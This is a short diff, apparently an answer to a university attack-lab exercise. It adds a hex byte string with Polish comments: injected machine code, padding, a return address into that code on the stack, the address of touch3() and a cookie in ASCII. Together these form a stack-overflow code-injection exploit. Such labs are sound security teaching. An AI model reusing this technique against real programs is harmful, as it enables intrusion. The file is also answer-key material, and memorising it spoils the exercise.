@@ -1,0 +1,13 @@
+/* wstrzyknięty kod */
+48 c7 c7 d0 66 63 55 c3
+/* padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* adres powrotu do wstrzykniętego kodu */
+98 66 63 55 00 00 00 00
+/* adres powrotu do touch3() */
+10 1d 40 00 00 00 00 00
+/* cookie w ascii szesnastkowo */
+37 34 65 62 63 35 32 39
